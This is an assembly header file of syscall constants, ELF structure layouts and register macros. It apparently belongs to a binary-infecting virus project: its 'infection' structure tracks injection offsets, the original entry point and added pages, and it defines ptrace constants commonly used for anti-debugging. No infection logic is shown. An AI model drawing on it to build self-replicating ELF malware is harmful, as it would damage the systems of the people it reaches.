; SYSCALL
%define     SYS_READ        0
%define     SYS_WRITE       1
%define     SYS_OPEN        2
%define     SYS_CLOSE       3
%define		SYS_LSEEK		8
%define		SYS_MMAP		9
%define		SYS_UNMAP		11
%define     SYS_SOCKET      41
%define     SYS_CONNECT     42
%define     SYS_SENDTO      44
%define     SYS_RECVFROM    45
%define     SYS_EXIT        60
%define		SYS_FTRUNCATE	77
%define		SYS_PTRACE		101
%define		SYS_GETPPID		110
%define     SYS_GETDENTS    217

; SOCKET
%define     AF_INET         2
%define     SOCK_STREAM     1

; OPEN
%define		O_RDONLY			0x0000
%define		O_WRONLY			0x0001
%define		O_RDWR				0x0002
%define		O_DIRECTORY			0q0200000
%define     O_CREAT             0x0040

; DIRENT
%define		D_INO_OFF			0x00
%define     D_FOLDER            0x4
%define		D_OFF_OFF			0x08
%define     D_REG_FILE          0x8
%define		D_RECLEN_OFF		0x10
%define		D_TYPE  			0x12
%define		D_NAME  			0x13

; MMAP
%define		PROT_EXEC		1
%define		PROT_READ		2
%define		PROT_WRITE		4
%define		MAP_SHARED		1
%define		MAP_PRIVATE		2
%define		MAP_ANONYMOUS   0x20

; LSEEK
%define		SEEK_SET			0x0
%define		SEEK_END			0x2

; PTRACE
%define		PTRACE_TRACEME		0x0
%define		PTRACE_DETACH		0x17

%define		CODE_LEN		(_end - _start)
%define		FINJMP_OFF		(_bf_exit - _start)
%define     PAGE_SIZE           0x1000

%define		FAM(x)				[(rbp - pestilence_size) + x]
%define		SOCK(x)				[(rbp - sock_size) + x]
%define		INF(x)				[(rbp - infection_size) + x]

%define		CODE_LEN			(_end - _start)
%define		FINJMP_OFF			(_bf_exit - _start)
%define		PAGE_SIZE			0x1000

struc pestilence
    .pwd                resb    PAGE_SIZE
    .dirents:           resb    PAGE_SIZE
    .fd                 resq    1
    .total_read:        resd    1
    .total_to_read:     resd    1
    .dirents_struct_ptr resq    1
endstruc

struc infection
	.file_fd			resq	1
	.map_addr			resq	1
	.map_size			resq	1
	.seg_nb				resb	1
	.seg_hdr_addr		resq	1
	.last_seg_hdr_addr	resq	1
	.injection_offset	resq	1
	.injection_addr		resq	1
	.sec_hdr_addr		resq	1	
	.original_entry 	resq	1
	.original_end		resq	1
	.add_page			resb	1
	.mem_eof			resq	1
	.shstrtab_addr		resq	1
	.got_str_index		resq	1
endstruc

; ELF structures
%define	PT_LOAD		0x1
%define	PT_NOTE		0x4
%define PF_X		0x1
%define PF_R		0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB	0x3
%define SHT_NOTE	0x7
%define SHT_RELA	0x4
%define SHF_ALLOC	0x2
%define SHF_EXECINSTR 0x4

struc	elf64_ehdr
	.e_ident:		resb	16
	.e_type:		resw	1
	.e_machine:		resw	1
	.e_version:		resd	1
	.e_entry:		resq	1
	.e_phoff:		resq	1
	.e_shoff:		resq	1
	.e_flags:		resd	1
	.e_ehsize:		resw	1
	.e_phentsize:	resw	1
	.e_phnum:		resw	1
	.e_shentsize:	resw	1
	.e_shnum:		resw	1
	.e_shstrndx:	resw	1
endstruc

struc	elf64_phdr
	.p_type:		resd	1
	.p_flags:		resd	1
	.p_offset:		resq	1
	.p_vaddr:		resq	1
	.p_paddr:		resq	1
	.p_filesz:		resq	1
	.p_memsz:		resq	1
	.p_align:		resq	1
endstruc

struc elf64_shdr
	.sh_name:		resd	1
	.sh_type:		resd	1
	.sh_flags:		resq	1
	.sh_addr:		resq	1
	.sh_offset:		resq	1
	.sh_size:		resq	1
	.sh_link:		resd	1
	.sh_info:		resd	1
	.sh_addralign	resq	1
	.sh_entsize		resq	1
endstruc

%macro PUSHA 0
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
%endmacro

%macro POPA 0
pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax
%endmacro